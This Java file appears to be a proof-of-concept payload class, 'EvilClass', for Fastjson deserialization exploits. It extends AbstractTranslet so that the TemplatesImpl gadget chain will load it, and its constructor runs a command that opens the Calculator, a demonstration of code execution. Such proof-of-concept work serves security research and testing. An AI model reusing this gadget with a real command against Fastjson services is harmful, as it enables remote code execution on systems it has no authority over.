package com.orleven.fastjson;

import java.io.IOException;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilClass extends AbstractTranslet {


    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }


    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public EvilClass() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }

    public static void main(String[] args) throws IOException {
        EvilClass helloworld = new EvilClass();
    }
}